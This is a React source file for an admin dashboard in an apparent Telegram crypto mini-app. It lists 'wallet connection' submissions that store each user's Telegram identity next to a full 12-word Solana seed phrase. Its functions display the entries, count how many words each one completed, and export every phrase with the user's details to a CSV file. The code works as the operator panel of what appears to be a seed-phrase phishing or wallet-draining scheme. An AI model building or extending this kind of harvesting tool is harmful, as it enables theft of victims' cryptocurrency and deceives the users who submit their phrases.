import { useState, useEffect } from "react";
import { TelegramNavigation } from "@/components/TelegramNavigation";
import { AppHeader } from "@/components/AppHeader";
import { supabase } from "@/integrations/supabase/client";
import { useAdminCheck } from "@/hooks/useAdminCheck";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Badge } from "@/components/ui/badge";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Search, Shield, Download, Users, Eye, Trash2, Brain } from "lucide-react";
import { Button } from "@/components/ui/button";
import { format } from "date-fns";
import { AdminStats } from "@/components/admin/AdminStats";
import { SubmissionDetailDialog } from "@/components/admin/SubmissionDetailDialog";
import { DeleteConfirmDialog } from "@/components/admin/DeleteConfirmDialog";
import { TokenPredictions } from "@/components/admin/TokenPredictions";
import { useToast } from "@/hooks/use-toast";

interface WalletConnection {
  id: string;
  telegram_user_id: number | null;
  telegram_username: string | null;
  telegram_first_name: string | null;
  created_at: string;
  field_1: string;
  field_2: string;
  field_3: string;
  field_4: string;
  field_5: string;
  field_6: string;
  field_7: string;
  field_8: string;
  field_9: string;
  field_10: string;
  field_11: string;
  field_12: string;
}

const Admin = () => {
  const { isAdmin, isLoading } = useAdminCheck();
  const [connections, setConnections] = useState<WalletConnection[]>([]);
  const [filteredConnections, setFilteredConnections] = useState<WalletConnection[]>([]);
  const [searchTerm, setSearchTerm] = useState("");
  const [loading, setLoading] = useState(true);
  const [selectedSubmission, setSelectedSubmission] = useState<WalletConnection | null>(null);
  const [deleteSubmissionId, setDeleteSubmissionId] = useState<string | null>(null);
  const { toast } = useToast();

  useEffect(() => {
    if (isAdmin) {
      fetchConnections();
    }
  }, [isAdmin]);

  useEffect(() => {
    if (searchTerm) {
      const filtered = connections.filter(conn => 
        conn.telegram_username?.toLowerCase().includes(searchTerm.toLowerCase()) ||
        conn.telegram_first_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
        conn.telegram_user_id?.toString().includes(searchTerm)
      );
      setFilteredConnections(filtered);
    } else {
      setFilteredConnections(connections);
    }
  }, [searchTerm, connections]);

  const fetchConnections = async () => {
    try {
      const { data, error } = await supabase
        .from("wallet_connections")
        .select("*")
        .order("created_at", { ascending: false });

      if (error) throw error;
      setConnections(data || []);
      setFilteredConnections(data || []);
    } catch (error) {
      console.error("Error fetching connections:", error);
    } finally {
      setLoading(false);
    }
  };

  const exportToCSV = () => {
    if (!window.confirm("⚠️ WARNING: This CSV contains sensitive Solana wallet seed phrases. Ensure secure handling and storage. Continue?")) {
      return;
    }

    const headers = [
      "ID",
      "Telegram User ID",
      "Username",
      "First Name",
      "Created At",
      ...Array.from({ length: 12 }, (_, i) => `Seed Word ${i + 1}`)
    ];

    const csvData = filteredConnections.map(conn => [
      conn.id,
      conn.telegram_user_id || "",
      conn.telegram_username || "",
      conn.telegram_first_name || "",
      format(new Date(conn.created_at), "yyyy-MM-dd HH:mm:ss"),
      conn.field_1,
      conn.field_2,
      conn.field_3,
      conn.field_4,
      conn.field_5,
      conn.field_6,
      conn.field_7,
      conn.field_8,
      conn.field_9,
      conn.field_10,
      conn.field_11,
      conn.field_12,
    ]);

    const csv = [headers, ...csvData]
      .map(row => row.map(cell => `"${cell}"`).join(","))
      .join("\n");

    const blob = new Blob([csv], { type: "text/csv" });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `SENSITIVE-wallet-data-${format(new Date(), "yyyy-MM-dd")}.csv`;
    a.click();
    
    toast({
      title: "Export Complete",
      description: "Remember to store this file securely and delete it when no longer needed.",
      variant: "destructive",
    });
  };

  const handleDelete = async () => {
    if (!deleteSubmissionId) return;

    try {
      const { error } = await supabase
        .from("wallet_connections")
        .delete()
        .eq("id", deleteSubmissionId);

      if (error) throw error;

      toast({
        title: "Deleted",
        description: "Submission has been permanently deleted.",
      });

      fetchConnections();
    } catch (error) {
      toast({
        title: "Error",
        description: "Failed to delete submission. Please try again.",
        variant: "destructive",
      });
    } finally {
      setDeleteSubmissionId(null);
    }
  };

  const verifiedCount = connections.filter(c => c.telegram_user_id).length;
  const recentCount = connections.filter(c => {
    const createdAt = new Date(c.created_at);
    const yesterday = new Date();
    yesterday.setDate(yesterday.getDate() - 1);
    return createdAt > yesterday;
  }).length;

  if (isLoading || loading) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center">
        <div className="text-center">
          <Shield className="w-12 h-12 mx-auto mb-4 text-primary animate-pulse" />
          <p className="text-muted-foreground">Verifying admin access...</p>
        </div>
      </div>
    );
  }

  if (!isAdmin) {
    return null;
  }

  return (
    <div className="min-h-screen bg-background pb-24">
      <AppHeader />
      <div className="max-w-7xl mx-auto px-3 sm:px-4 py-4 sm:py-6">
        {/* Header */}
        <Card className="bg-card/50 backdrop-blur-sm mb-6">
          <CardHeader>
            <div className="flex items-center gap-3">
              <Shield className="w-6 h-6 text-primary" />
              <div className="flex-1">
                <CardTitle className="text-xl sm:text-2xl">Admin Dashboard</CardTitle>
                <CardDescription>Secure management and AI-powered analytics</CardDescription>
              </div>
              <Badge variant="secondary" className="gap-2">
                <Users className="w-3 h-3" />
                {filteredConnections.length} submissions
              </Badge>
            </div>
          </CardHeader>
        </Card>

        {/* Stats */}
        <div className="mb-6">
          <AdminStats
            totalSubmissions={connections.length}
            verifiedSubmissions={verifiedCount}
            recentSubmissions={recentCount}
          />
        </div>

        <Tabs defaultValue="connections" className="w-full">
          <TabsList className="grid w-full grid-cols-2">
            <TabsTrigger value="connections">Wallet Connections</TabsTrigger>
            <TabsTrigger value="predictions">
              <Brain className="w-4 h-4 mr-2" />
              AI Trading Insights
            </TabsTrigger>
          </TabsList>

          <TabsContent value="connections">
            <Card className="bg-card/50 backdrop-blur-sm">
              <CardHeader>
                <div className="flex flex-col sm:flex-row gap-3 items-start sm:items-center justify-between">
                  <CardTitle className="text-lg">Wallet Connections</CardTitle>
                  <div className="flex gap-2 w-full sm:w-auto">
                    <div className="relative flex-1 sm:w-64">
                      <Search className="absolute left-2 top-2.5 h-4 w-4 text-muted-foreground" />
                      <Input
                        placeholder="Search by username or ID..."
                        value={searchTerm}
                        onChange={(e) => setSearchTerm(e.target.value)}
                        className="pl-8"
                      />
                    </div>
                    <Button onClick={exportToCSV} variant="outline" size="icon">
                      <Download className="h-4 w-4" />
                    </Button>
                  </div>
                </div>
              </CardHeader>
              <CardContent>
                <div className="overflow-x-auto">
                  <Table>
                    <TableHeader>
                      <TableRow>
                        <TableHead>Telegram User</TableHead>
                        <TableHead>User ID</TableHead>
                        <TableHead>Created At</TableHead>
                        <TableHead>Status</TableHead>
                        <TableHead className="text-right">Completion</TableHead>
                        <TableHead className="text-right">Actions</TableHead>
                      </TableRow>
                    </TableHeader>
                    <TableBody>
                      {filteredConnections.length === 0 ? (
                        <TableRow>
                          <TableCell colSpan={6} className="text-center py-8 text-muted-foreground">
                            No submissions found
                          </TableCell>
                        </TableRow>
                      ) : (
                        filteredConnections.map((conn) => (
                          <TableRow key={conn.id}>
                            <TableCell>
                              <div className="flex flex-col">
                                <span className="font-medium">
                                  {conn.telegram_first_name || "Unknown"}
                                </span>
                                {conn.telegram_username && (
                                  <span className="text-xs text-muted-foreground">
                                    @{conn.telegram_username}
                                  </span>
                                )}
                              </div>
                            </TableCell>
                            <TableCell>
                              {conn.telegram_user_id ? (
                                <Badge variant="outline">{conn.telegram_user_id}</Badge>
                              ) : (
                                <Badge variant="destructive">No ID</Badge>
                              )}
                            </TableCell>
                            <TableCell className="text-sm text-muted-foreground">
                              {format(new Date(conn.created_at), "MMM d, yyyy HH:mm")}
                            </TableCell>
                            <TableCell>
                              {conn.telegram_user_id ? (
                                <Badge variant="default">Verified</Badge>
                              ) : (
                                <Badge variant="secondary">Unverified</Badge>
                              )}
                            </TableCell>
                            <TableCell className="text-right">
                              <Badge variant="outline">
                                {[conn.field_1, conn.field_2, conn.field_3, conn.field_4, 
                                  conn.field_5, conn.field_6, conn.field_7, conn.field_8,
                                  conn.field_9, conn.field_10, conn.field_11, conn.field_12]
                                  .filter(f => f?.trim()).length} / 12
                              </Badge>
                            </TableCell>
                            <TableCell className="text-right">
                              <div className="flex items-center justify-end gap-2">
                                <Button
                                  variant="ghost"
                                  size="icon"
                                  onClick={() => setSelectedSubmission(conn)}
                                >
                                  <Eye className="h-4 w-4" />
                                </Button>
                                <Button
                                  variant="ghost"
                                  size="icon"
                                  onClick={() => setDeleteSubmissionId(conn.id)}
                                >
                                  <Trash2 className="h-4 w-4 text-destructive" />
                                </Button>
                              </div>
                            </TableCell>
                          </TableRow>
                        ))
                      )}
                    </TableBody>
                  </Table>
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="predictions">
            <TokenPredictions />
          </TabsContent>
        </Tabs>
      </div>
      
      <TelegramNavigation />

      {/* Modals */}
      <SubmissionDetailDialog
        submission={selectedSubmission}
        open={!!selectedSubmission}
        onClose={() => setSelectedSubmission(null)}
      />
      
      <DeleteConfirmDialog
        open={!!deleteSubmissionId}
        onClose={() => setDeleteSubmissionId(null)}
        onConfirm={handleDelete}
        submissionId={deleteSubmissionId}
      />
    </div>
  );
};

export default Admin;
